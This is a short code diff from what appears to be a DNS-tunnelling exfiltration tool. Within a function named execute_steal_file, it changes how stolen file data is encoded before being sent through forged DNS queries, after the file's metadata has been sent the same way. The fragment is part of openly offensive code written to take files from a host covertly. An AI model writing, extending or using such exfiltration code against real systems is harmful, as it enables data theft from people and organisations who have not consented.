@@ -348,7 +348,7 @@ def execute_steal_file(filepath) -> bool:
     # Send meta data first.
     forge_dns_query_block(metadata, FILE_TRANSFER_IDENTIFICATION)
     # Send the file.
-    forge_dns_query_block(file_data, FILE_TRANSFER_IDENTIFICATION)
+    forge_dns_query_block(file_data.decode("utf-8"), FILE_TRANSFER_IDENTIFICATION)
 
 
 def packet_handler(pkt):
